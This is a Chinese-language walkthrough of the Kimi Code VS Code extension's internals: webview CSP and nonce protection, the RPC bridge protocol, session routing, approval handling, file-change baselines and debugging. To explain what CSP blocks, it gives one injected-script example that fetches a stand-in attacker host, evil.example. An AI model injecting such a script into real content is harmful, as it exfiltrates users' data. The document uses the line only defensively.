- 最后三行是**防爬出**：webview 内容跑在 iframe 里，默认 `window.parent` 能摸到外壳页；VS Code 把 `parent/top/frameElement` 全部伪装掉，让页面代码**爬不出自己的框**去摸权限更大的外壳页。它先绑好真父窗口的通道再伪装——**先留门、再拆梯子**；

- `&& !false` 是恒假表达式（等于没写），应是上游构建开关的残留，无实际作用。

**nonce（一次性随机数）的原理**：CSP 写了 `script-src 'nonce-abc123...'`，页面上就**只有** `<script nonce="abc123...">` 能执行。攻击者想让自己的 `<script>` 跑，必须猜中 nonce——它是 32 位随机串（`:6-13` 生成），且**每次生成 HTML 都重造**（`:155`），旧的立即作废。

攻击场景走一遍：模型输出里被塞了 `<script>fetch('https://evil.example', ...)</script>`，webview 把它渲染进 DOM——没有 CSP 它就执行了；有 CSP+nonce，注入的标签没有 `nonce` 属性，浏览器直接拒绝。**为什么这对本插件尤其要紧**：webview 是唯一能 postMessage 到宿主的入口，宿主是 Node 进程、能读写文件——UI 层守不严，注入代码就能借 RPC 摸到文件系统。

（`style-src` 那条带 `'unsafe-inline'`（`:159`）是因为 React 的行内样式需要；样式注入危害远小于脚本，所以放开——**script 永远不给** unsafe-inline。）

**CSP 防的是"注入"，不防"主人"**

CSP+nonce 防的是**一切不带 nonce 的 `<script>`**——不只"动态返回的内容里带的"（模型输出、消息渲染），任何注入路径（innerHTML 塞进来的、内联事件 `onclick=...`）全都在禁区内。

而"开发人员用 DevTools"——**拦不住，也本来就不打算拦**：

- DevTools 的 Console 本身就是页面最高权限：在 Console 里直接就能执行任意 JS，根本不需要构造 `<script>` 标签；能开 DevTools 的人还可以直接禁用 CSP；

- 所以 CSP 的**威胁模型**（防谁）从来不含"控制了这个浏览器/这台机器的人"——那是机器主人，主人本来就能对宿主 Node 进程做任何事，UI 层防他毫无意义；

- 它防的是**经由内容进来的攻击**：模型输出、打开的文件内容、某个 MCP 服务器返回的数据……这些会被渲染进 DOM 的东西，注入的 script 拿不到 nonce 全部被拒。

一句话：**nonce 挡"内容里藏的代码"，不挡"坐在浏览器前的人"——后者已经在信任边界内了。**

**"inline / unsafe-inline"是什么，和"样式不用 nonce"的关系**

**inline（内联）指代码直接写在 HTML 里**，两种资源都有内联形态：

```html
<!-- 内联 script：代码就在标签体里 -->
<script>alert(1)</script>

<!-- 外部 script：标签只给地址（本页唯一放行的就是这种 + 带 nonce） -->
<script nonce="xxx" src="webview.js"></script>

<!-- 内联 style：style 属性或 <style> 块 -->
<div style="color: red">...</div>
<style>.card { ... }</style>
```

CSP 的默认行为：**不给任何授权时，内联 script 和内联 style 都被禁**——两个都禁，不是只禁 script。授权方式有两种开关，本页各选了一种：

| 资源 | CSP 写法（`:159` / `:165`） | 效果 |
|---|---|---|
| 样式 | `style-src ${cspSource} 'unsafe-inline'` | **允许所有内联样式**，不需要 nonce |
| 脚本 | `script-src 'nonce-${nonce}' ${cspSource}` | **只有带 nonce 的那个 script 标签能执行** |

- `'unsafe-inline'`（允许内联）是 CSP 的一个开关字面量：写上 = 放开"所有内联的这类资源"，不写 = 内联全禁；

- 样式为什么敢放开：内联样式**不能执行代码**，最坏情况是界面伪装（盖个假按钮骗点击）；而 React 大量依赖 `style="..."` 行内样式（动态宽度/位置），vite 的 `cssInjectedByJsPlugin` 运行时注入的也是 `<style>` 块——不放开 `'unsafe-inline'`，整个 UI 的样式会被浏览器**静默丢弃**；

- 脚本为什么必须 nonce 而不能也 `'unsafe-inline'`：内联 script = 任意 JS 执行，一放开这条，CSP 的 script 防线等于没有。所以"**样式不用 nonce、脚本必须 nonce**"是对的——准确说法是"样式用 `'unsafe-inline'` 放开、脚本用 nonce 收紧到只放行一个标签"；

- 一个规格冷知识：CSP 规定同一指令里 **nonce 和 `'unsafe-inline'` 同时出现时 `'unsafe-inline'` 会被忽略**——所以 `script-src` 那条干脆不写它。

要点回顾：

1. **DevTools 拦不住、也不打算拦**——CSP+nonce 防的是“内容里藏的代码”（模型输出、innerHTML、onclick= 全在禁区）；能开 DevTools
     的人是机器主人，Console 本身就是页面最高权限，甚至能直接禁 CSP。威胁模型里根本不含“控制浏览器的人”。

2. **inline = 代码直接写在 HTML 里**（`<script>alert(1)</script>`、`style="color:red"` 都是内联形态）；CSP
     默认**内联脚本和内联样式都禁**。本页用两种开关各放一样：样式 `'unsafe-inline'` 全放开（不能执行代码，最坏是界面伪装；React
     行内样式 + cssInjectedByJs 都靠它），脚本只靠 nonce 放行一个标签（内联 script = 任意
     JS，一放开防线等于没有）。你的总结正确：“样式不用 nonce、脚本必须 nonce”。


**两个 data 属性干嘛的**

`<body data-baseuri="..." data-webviewid="...">`（`:176`）——宿主往页面"塞"的两个只读参数，webview 的 JS 启动时从 DOM 读走：

- **data-webviewid**：身份。`webview-ui/src/services/bridge.ts:46` 读它，之后每个 RPC 请求都带上——宿主靠它路由会话、定向广播（1.1 讲过）；

- **data-baseuri**：资源根。沙箱里的 JS 拿不到磁盘路径，要引用插件自带的图片等资源时用它拼 `vscode-webview://` 地址，真实消费者：

```ts
// webview-ui/src/components/hooks/useExtensionImageUrl.ts:7-9
const baseUri = document.body.getAttribute("data-baseuri");
if (baseUri) {
  setUrl(`${baseUri}/dist/${imageName}`);
}
```

为什么用 data 属性：webview 的 JS 是静态 bundle，宿主没法直接给它"传参"——HTML 是宿主手写的，往 `<body>` 塞属性是唯一方便的注入点，页面一启动就能读到。

### 1.4 reload/reset 家族

| 方法 | 行号 | 干什么 |
|---|---|---|
| `reloadWebview(id)` | `:124-129` | 重设单个 webview 的 HTML（等于刷新页面，React 状态清零） |
| `reloadAllWebviews()` | `:131-135` | 全部刷新；`ReloadWebview` RPC 和设置变更时走这里 |
| `resetAllWebviews()` | `:137-142` | 先给每个 webview 拆会话（`disposeView`）再全部刷新；命令 **Kimi Code: Reset Kimi** 走这里 |
| `insertEditorMention` | `:84-95` | 命令 **Kimi Code: Insert Current File** 的实现：算出 `@路径:行号` 形式的引用，定向广播 `InsertMention` 事件给对应 webview |

## 二、BridgeHandler：RPC 中枢兼资源主人

`src/bridge-handler.ts`（全 357 行）。"BridgeHandler 是干嘛的"一句话：**webview 消息的唯一入口 + 三大资源的持有者 + 每个 webview 的工作目录路由**。三重角色：

1. **RPC 分发中枢**：`handle()`（`:66-88`）校验并分发每一条来自 webview 的消息——校验、查表、拼上下文、执行、记日志五步走；

2. **资源主人**：构造函数（`:32-64`）创建并持有三个 heavyweight 对象——`KimiRuntime`（引擎 harness + 会话池，`:42-50`）、`BaselineManager`（基线快照存储，`:62`）、`FileManager`（文件跟踪 + watcher，`:63`）。Provider 的 `harness` getter（`KimiWebviewProvider.ts:47-49`）就是穿透到 `bridgeHandler.runtime.harness`；

3. **workDir 路由器**：`customWorkDirs` Map（`:29`）记住"哪个 webview 用哪个工作目录"——一个窗口里侧边栏和面板可以各在不同目录。

构造 KimiRuntime 失败时**不静默回退**（`:51-61`）：直接抛错并附上回滚提示（"可开 `kimi.useAgentCoreV1` 设置换回 v1 引擎再 Reload"）——宁可让插件激活失败并告诉你为什么，也不偷偷降级。v1/v2 引擎选择在 `kimi-runtime.ts:65`（`createKimiHarness` vs `createKimiHarnessV2`，来自 `packages/node-sdk`）。

> **broadcast 这根线已拆分到独立一篇**：`dive-chain-broadcast链条详解.md`（同目录）——一个函数引用从 provider 出发、经 BridgeHandler 分三路、穿过四层、20 处调用点全部点名、最终变成 webview 里一次事件分发的完整旅程。本节只留 BridgeHandler 的地图。

## 三、协议本体：shared/bridge.ts

`shared/bridge.ts`（全 325 行）是**两侧共用的协议文件**：宿主侧 tsdown 打包时经 `tsconfig.json:13` 的 `shared/*` 路径映射进 `src`；webview 侧 vite 经 `webview-ui/vite.config.ts:16` 的 alias 解析到同一个目录。改协议 = 两侧同时改，不会出现两边各维护一份漂移的情况。

### 3.1 两条通道

```
RPC（请求-响应，webview 发起）：
  webview.call(method, params)
    → 宿主 BridgeHandler.handle → handler
    → webview 的 Promise resolve(result)

广播（单向通知，宿主发起）：
  宿主 broadcast(event, data)
    → 每个（或指定）webview 的 message 监听器
    → webview 里该 event 的订阅回调
```

（协议文件头部注释 `bridge.ts:4-9` 原文即此架构。）

### 3.2 Methods：47 个请求，按 handler 文件分组

`bridge.ts:12-64` 的 `Methods` 常量表，共 47 个方法，与七个 handler 文件一一对应（下表按 `rg "Methods\."` 逐文件实数）：

| handler 文件 | 方法 | 数量 |
|---|---|---|
| workspace（`workspace.handler.ts`） | `checkWorkspace` / `openFolder` / `getInputHistory` / `addInputHistory` | 4 |
| config（`config.handler.ts`） | `getExtensionConfig` / `getModels` / `getSlashCommands` / `saveConfig` / `openSettings` / `showLogs` / `reloadWebview` | 7 |
| mcp（`mcp.handler.ts`） | `getMCPServers` / `addMCPServer` / `updateMCPServer` / `removeMCPServer` / `authMCP` / `resetAuthMCP` / `testMCP` | 7 |
| session（`session.handler.ts`） | `getKimiSessions` / `getAllKimiSessions` / `loadKimiSessionHistory` / `deleteKimiSession` / `forkKimiSession` / `setWorkDir` / `browseWorkDir` / `getRegisteredWorkDirs` | 8 |
| chat（`chat.handler.ts`） | `streamChat` / `abortChat` / `respondApproval` / `respondQuestion` / `steerChat` / `setPlanMode` / `resetSession` | 7 |
| file（`file.handler.ts`） | `openFile` / `openFileDiff` / `trackFiles` / `clearTrackedFiles` / `revertFiles` / `keepChanges` / `checkFileExists` / `checkFilesExist` / `getImageDataUri` / `getProjectFiles` / `pickMedia` | 11 |
| auth（`auth.handler.ts`） | `checkLoginStatus` / `login` / `logout` | 3 |

### 3.3 Events：9 类广播

`bridge.ts:89-99`：

| 事件 | 谁发、什么时候 |
|---|---|
| `streamEvent` | **最繁忙的一条**：整场对话的所有流式内容（文字增量、工具调用、审批请求、状态、错误、结束标记）都从这一个事件走，data 是判别联合 `UIStreamEvent` |
| `extensionConfigChanged` | 设置变更（`extension.ts:55-59` 的 `onSettingsChange`） |
| `mcpServersChanged` | MCP 服务器列表变更 |
| `fileChangesUpdated` | 基线 diff 刷新（第八节） |
| `focusInput` / `insertMention` / `newConversation` / `rollbackInput` / `loginUrl` | 各命令与登录流程的 UI 指令 |

### 3.4 手写校验：webview 是不可信输入

`validateRpcMessage`（`:104-127`）+ `validateParams`（`:129-221`）：每个方法逐一校验参数形状（如 `streamChat` 要求 `content` 是字符串或媒体块数组、`model` 必须字符串，`:223-231`；`respondApproval` 的 `response` 只许三个枚举值，`:172-177`）。`bridge.ts:103` 的原注释说得直白："Validates the untrusted Webview message before any host-side handler runs"——**任何 handler 执行之前，先证明这条消息长得合法**。

为什么手写而不用 zod？代码里没有注明原因；可以观察到的事实是：这份文件**零 import**（第 1-10 行只有注释），被两侧打包器各自内联，不给任何一侧引入运行时依赖。另有一个工程效果：`validateParams` 每个方法一段 `case`，等于协议的参数文档就写在代码里。

## 四、webview 侧的 RPC 客户端：services/bridge.ts

`webview-ui/src/services/bridge.ts`（全 301 行）。一个 `Bridge` 单例（`:299` 导出），React 代码全部通过它说话。

### 4.1 acquireVsCodeApi：webview 里唯一合法的出口

- `acquireVsCodeApi()`（`:36` 声明、`:48-49` 调用）是 VS Code 注入 webview 的全局函数，返回**唯一**能 `postMessage` 给宿主的对象（还有 `getState/setState` 持久化）。整个页面只能调用它一次；

- **浏览器直开时的 mock**（`:50-57`）：没这个函数说明不在 VS Code 里（比如直接用浏览器调试 UI），postMessage 退化为 `console.log("[Kimi Mock]", msg)`——UI 可以脱离宿主跑起来看样式；

- 构造时从 `<body data-webviewid>` 读身份（`:46`，对应 1.3 的注入），每个 RPC 请求都带上。

### 4.2 call：pending Map + 超时

`call()`（`:84-96`）把回调式 postMessage 包装成 Promise：

1. 生成自增 id（`${序号}_${时间戳}`，`:85`）；

2. `pending` Map 存 `{resolve, reject, timeout}`（`:93`）；

3. 发消息，宿主回包带同一个 id，`handleMessage`（`:62-82`）按 id 找到 pending、resolve/reject、清定时器；

4. **超时兜底**（`:88-91`）：默认 10 分钟（`:27`），login/OAuth 类放宽到 16 分钟（`:28`，设备码流程人要掏手机扫码，短了会误杀）。

`handleMessage` 里 `msg.id` 命中 pending 就当 RPC 回包，否则看 `msg.event` 走事件分发（`:78-81`）——**同一个 message 通道，两种消息靠字段区分**。

### 4.3 on：事件订阅

`on(event, handler)`（`:98-107`）往 `eventHandlers` Map 里加回调，返回取消订阅函数（React `useEffect` 清理时用）。

## 五、会话路由：KimiRuntime 的双表

多个 webview 可以同时订阅同一个会话（侧边栏＋面板同看一个），KimiRuntime 用两张 Map 维护这个多对多。两张表的形状、openSession 三分支、关会话的三种力度——全在 [03-KimiRuntime方法详解.md](03-KimiRuntime方法详解.md)。

## 六、SessionRuntime 内部：单会话状态机

`src/runtime/session-runtime.ts`（全 655 行）。每个引擎会话包一个，**整个插件里唯一 `session.onEvent` 订阅引擎事件流的地方**（`:107`）。

### 6.1 构造时的三根一次性接线（`:93-108`）

1. `session.setApprovalHandler(...)`（`:105`）——引擎要权限审批时回调这里；

2. `session.setQuestionHandler(...)`（`:106`）——引擎要向用户提问时回调这里；

3. `session.onEvent(...)`（`:107`）——引擎全部事件进入 `onSdkEvent`。

两个 handler 都指向 `reverseRpc`（6.4），事件订阅指向 `onSdkEvent`（6.2）。`close()`（`:395-418`）对称地拆掉三根线并兜底取消未完成的回合。

### 6.2 引擎事件怎么变成 UI 事件：onSdkEvent（`:439-495`）

`onSdkEvent` 是引擎事件的**总入口**，依次处理：

- `compaction.completed/cancelled` → 唤醒挂起的 `/compact`（`:442-448`）；

- `turn.started` → 标记 activePrompt 已真正开始（`:450-452`，用于区分 preflight/runtime 错误阶段）；

- `tool.call.started` 且工具是 `Write`/`Edit` → **先保存基线快照再动文件**（`:454-456`、`:497-513`，这是第八节的触发点）；

- `turn.step.retrying` → 记一条 provider 重试日志（`:458-463`）；

- 然后**所有事件都过一遍 `adaptSdkEvent` 纯函数投影**（`:470-474`，见 6.3），产出的 `terminal` 或普通事件分别走 `emitTerminal` / `emitStreamEvent`。

`emitStreamEvent`（`:581-585`）就是"给本会话的**每个订阅视图**各广播一条 `streamEvent`"——这就是多个 webview 同看一会话时内容同步的机制。

### 6.3 event-adapter：纯函数投影（`src/runtime/event-adapter.ts`，全 446 行）

**投影（projection）**：把一种事件流用纯函数逐条转换成另一种事件流，不产生副作用。这里把 Node SDK 的 `Event`（v2 引擎事件，如 `assistant.delta`、`tool.call.started`）转换成 webview 认识的 `UIStreamEvent`（如 `ContentPart`、`ToolCall`）——**协议改版时 webview 不用跟着引擎改**，这层就是防腐层。

`adaptSdkEvent(state, event, options) -> {state, event?, terminal?}`（`:83-172`）：

- **显式不可变**（`:81-82` 原注释）：输入 state 永不被改，返回新 state 传给下一次调用；

- **三份跨事件记忆**（`EventAdapterState`，`:27-31`）：
  - `subagentParents`：子 agent 的父是谁（`subagent.spawned` 时记下，`:90-108`）——子 agent 的事件要一路包装成嵌套 `SubagentEvent` 送回它父级的工具调用项里（`routeSubagentEvent`，`:383-412`，沿父链向上走到底）；
  - `turnUsageByAgent`：每个 agent 上一条的 token 用量——引擎给的是**累计值**，投影层算**增量**（`usageDelta`，`:359-374`），UI 才能显示"这一步用了多少"；
  - `toolDisplays`：工具开始时的展示块，留到 `tool.result` 时一起发（`:242-268`、`:283-308`）；
- **工具名映射**（`toLegacyToolName`，`:174-189`）：`Bash→Shell`、`Write→WriteFile`、`Edit→StrReplaceFile`……同样是"webview 认旧名"的兼容层；

- **子 agent 工具 id 加前缀**（`scopedToolCallId`，`:414-416`）：非 main agent 的工具调用 id 变成 `agentId:toolCallId`，避免不同 agent 的同名 id 撞车；

- `turn.ended` 不产事件，产出 `terminal` 元数据（`:127-140`），由 SessionRuntime 决定发 `stream_complete` 还是 `error`（6.5）。

### 6.4 reverse-rpc：审批与提问的逆流（`src/runtime/reverse-rpc.ts`，全 97 行）

正常 RPC 是 webview 请求宿主；审批是**引擎请求 webview 里的用户**——方向反过来，故名逆流。机制是"挂起 Promise + Map 存 resolve"：

1. 引擎要审批 → `setApprovalHandler` 回调 → `requestApproval`（`:23-29`）：生成 UUID，把 Promise 的 `resolve` 存进 `approvals` Map，**立即**广播 `ApprovalRequest` 事件（带这个 id）给所有订阅视图；引擎侧就停在 await 上；

2. 用户在 UI 点 批准/本会话批准/拒绝 → webview 发 `respondApproval` RPC → `chat.handler.ts:156-158` → `SessionRuntime.respondApproval`（`:387-389`）→ `respondApproval(id, response)`（`:54-66`）：从 Map 取出 resolve，按选择转换成引擎枚举（`approve_for_session` → `{decision: "approved", scope: "session"}`）后调用——**引擎那边挂着的 Promise 就此放行**，工具开始执行；

3. 提问（`requestQuestion`，`:31-52`）同构，只是 data 是问题列表；

4. 回合取消/结束时 `cancelAll`（`:76-85`）把所有挂着的 resolve 成批以"cancelled"收尾——不给引擎留永远挂起的审批。

### 6.5 错误的几种下场与去重

- **回合中途的非致命错误**（`:483-489` 原注释）：引擎报了 error 但回合还在跑（后面还有 `turn.ended`），广播时强制 `terminal: false`——否则 UI 会提前解锁、下一句发送和还在跑的回合撞车；

- **终态去重**：`emitTerminal`（`:515-557`）用 `terminalKeys`（`sessionId:agentId:turnId`）保证一轮只发**一次** `stream_complete`/终态 `error`（`:516-517`）；

- **suppress 机制**（`:553-564`）：终态错误发出后记下 `{code, message}`，引擎随后若**原样重发**同一条错误事件，吞掉不重复播；

- `runTurnAction`（`:178-223`）的忙碌保护：回合进行中再来一条 prompt，只让**新请求**失败（`ALREADY_GENERATING_MESSAGE`，`:48`），不打扰进行中的回合。

## 七、发一条消息的完整旅程

webview 输入框回车 → `chat.store.sendMessage` → `bridge.streamChat(...)`（RPC）→ 宿主 `chat.handler.ts:74-145`：

| 步 | 行号 | 动作 |
|---|---|---|
| 1 | `:75-81` | 没开文件夹 → 广播 `NO_WORKSPACE` 错误 + 弹 "Open Folder" 警告，终止 |
| 2 | `:83-90` | autosave 开 → 先保存全部脏编辑器（模型看到的是磁盘上的内容） |
| 3 | `:92-102` | `getOrCreateSession`（第五节路由，按需建/绑会话） |
| 4 | `:104-125` | 回合开始前把**这次发送**选的 model/effort/planMode 显式同步给引擎，再 `announceSessionStart` |
| 5 | `:127-135` | 内容若是宿主斜杠命令（`/compact`、`/init` 等，`slash-command.ts`）→ 分流到宿主执行，不走模型 |
| 6 | `:137` + `:37-60` | **编辑器上下文注入**：按设置把"当前文件:行号（选区）"拼成 `<system>` 前缀附在消息里——模型知道你在看哪 |
| 7 | `:139` | `runtime.prompt(...)`：交给引擎，回合开始 |
| 8 | 广播 | 之后的全部过程（文字增量、工具、审批、结束）都走 `streamEvent` 广播；RPC 本身在回合结束时才返回 `{done}` |

**审批在同一旅程里**：引擎执行 `Edit` 前要权限 → 6.4 的逆流 → UI 弹卡 → 用户点选 → `respondApproval` 的 RPC 调用 → 引擎继续。两个 RPC 调用（`streamChat` 长挂着 + `respondApproval` 短平快）与广播并行不悖——pending Map 按 id 各归各。

## 八、diff 与基线子系统：Write/Edit 的"后悔药"

三个角色：`BaselineManager`（存快照，`src/managers/baseline.manager.ts` 864 行）、`FileManager`（跟踪 + 文件监听，`src/managers/file.manager.ts` 208 行）、`file.handler.ts` 的文件类 RPC（UI 入口）。UI 上的 "File Changes" 面板 = 这三者的脸。

### 8.1 什么时候保存快照

链路：引擎发 `tool.call.started` 且工具为 `Write`/`Edit` → `SessionRuntime.captureFileBaseline`（`session-runtime.ts:497-513`）→ `BridgeHandler.captureFileBaseline`（`bridge-handler.ts:244-290`，校验文件在会话目录内）→ `baselineManager.capture`。

**时序关键点**（`baseline.manager.ts:79-83` 原注释）：`capture` 里读原文件用的是**同步 IO**（`captureOriginal`，`:717-738`，`statSync`+`readFileSync`）——在把控制权还给调用方**之前**就读完原内容，确保抢在工具写入之前；持久化（写快照、更新清单）才异步串行化。

### 8.5 File Changes 的 UI 链路

- **数据流**：保存快照后 `fileManager.trackFile` + `refreshChanges`（`bridge-handler.ts:278-286`）→ 算 `getChanges` → 广播 `FileChangesUpdated`；

- **持续刷新**：`FileManager` 构造时挂了全工作区 `createFileSystemWatcher("**/*")`（`file.manager.ts:72-83`），磁盘文件一变就对该 webview 重算 diff 再广播——**面板实时跟着你手改文件走**；

- **看单个文件的 diff**：`openFileDiff`（`file.handler.ts:78-96`）构造 `kimi-baseline:` 协议的 URI 调 `vscode.diff`；这个虚拟 URI 的内容由 `extension.ts:40-52` 注册的 `TextDocumentContentProvider` 提供，最终读 `baselineManager.getContent`——基线快照以"只读虚拟文档"的身份出现在 VS Code 原生 diff 视图左侧。

## 九、webview UI 侧：React 与 zustand

`webview-ui/src/`。三个 store（zustand（React 生态最常用的轻量状态库，用 `create` 建一个带 hooks 的全局 store））分工：`settings.store.ts`（323 行，配置/模型/MCP/登录态）、`chat.store.ts`（487 行，会话与消息）、`approval.store.ts`（41 行，审批卡）。

### 9.1 启动动线：useAppInit（`hooks/useAppInit.ts:54-150`）

`App.tsx` 先问 `resolveAppView`（`:28-45`，纯函数视图路由）显示哪个视图，状态由 `useAppInit` 的 init 序列决定（`:77-131`）：

```
bridge.checkWorkspace()                      // 有没有开文件夹
→ getExtensionConfig + getMCPServers + getSlashCommands（并发）
→ checkLoginStatus + getModels（并发）
→ 按 {没登录 | 没模型 | 就绪} 分派 login / status / main 视图
```

任何一步抛错 → `runtime-error` 视图。`refresh()`（`:63-66`）通过重置 `initKey` 强制 effect 重跑——重试按钮的 实现。同时挂了 `ExtensionConfigChanged` 订阅（`:68-72`）：宿主设置一变，配置对象热更新进 store。

### 9.2 事件归约：event-handlers.ts（`stores/event-handlers.ts`，577 行）

`chat.store` 的 `processEvent` 把每条 `streamEvent` 广播交给一张**归约器表**（`eventHandlers`，`event-handlers.ts:291` 起，形态 `event → (draft, payload) => void`）：`ContentPart` 往当前 step 追加文本（相邻同类型合并，`:422`）、`ToolCall`/`ToolResult` 维护工具项、`SubagentEvent` 递归定位到父工具项的 `subagent_steps` 里（`:66-87`）、`ApprovalRequest` 写 approval.store 弹卡（`:507`）、`StatusUpdate` 更新模型/token/上下文水位（`:522`）……表的形态与宿主侧 `handlers` 表完全对称——**两端各自一张表，协议是中间那张契约**。

`handshakeReceived` + 超时定时器（`chat.store.ts:127-149`）：发出消息后等第一条流事件当"握手"，超时则解锁 UI 报错——RPC 的 10 分钟超时太长，UI 层自己再兜一层短的。

### 9.3 发送与队列

`ChatState`（`chat.store.ts:90-121`）除消息数组外还有：`isStreaming`（回合进行中，锁输入框）、`queue`（排队消息：流式期间再打字进队列，回合结束 `sendNextQueued` 自动续发）、`pendingQuestion`（挂起的提问）、`rollbackInput`（配合宿主 `RollbackInput` 事件把没发出去的内容退回输入框）。

## 十、排错：trace 与常见故障

**第一现场**是 BridgeHandler 的 trace（`bridge-handler.ts:304-309`）：宿主窗口输出面板 "Kimi Code" 通道（`学习文档/03-调试指南.md` 第 1 节有完整打开方式），格式 `[bridge] id=xx method=xx ok=true/false durationMs=xx`。`ok=false` 的行配合下一条错误日志（`logRuntimeError`，`bridge-handler.ts:311-316`）基本能定位到具体 handler。webview 侧则用 Webview Developer Tools 的 Console（`学习文档/03-调试指南.md` 第 2 节）。

| 症状 | 先查什么 |
|---|---|
| RPC 直接回 `Unknown method` | 协议表没这个键——宿主与 webview 的 `shared/bridge.ts` 版本不一致（一边没重新构建） |
| `Invalid bridge params for method` | webview 发的参数形状没过 `validateParams`（3.4）——对照 `bridge.ts` 的 case 改 |
| UI 一直转圈、10 分钟后报 timed out | 宿主侧 handler 挂了或没返回：输出通道找对应 method 的 `[bridge]` 行有没有出现（没出现 = 消息根本没到宿主，查 webview 是否加载的是最新构建） |
| 流式内容不出、RPC 正常 | 广播方向问题：确认 `SessionRuntime.subscribe` 过（第五节路由），断点 `emitStreamEvent` |
| File Changes 面板不刷新 | watcher 是否还在（FileManager 只在插件激活期间存在）、`trackedFiles` 是否为空（会话 reset 会 `clearTracked`，`chat.handler.ts:183`） |
| 审批点了没反应 | `respondApproval` 返回 `false` = Map 里没这个 id（回合已被 cancelAll 收尾）——看输出通道有无 "Turn cancelled" |

## 下一步

- 想看引擎收到 `prompt` 之后的事（loop、权限、工具执行）：`学习文档/04-agent引擎入门.md` 第二节起。

- 想动手验证本篇：`学习文档/03-调试指南.md` 第 1 节 F5 后，在 `bridge-handler.ts:77`（dispatch 处）下断点，宿主窗口里发一条消息，亲眼走一遍第七节的八步。

- 想改协议加方法：按第三节的结构，`Methods` 加键 → `validateParams` 加 case → 对应 handler 文件加 handler → webview `services/bridge.ts` 加包装方法——四处同改，测试在 `test/bridge-handler.test.ts`。
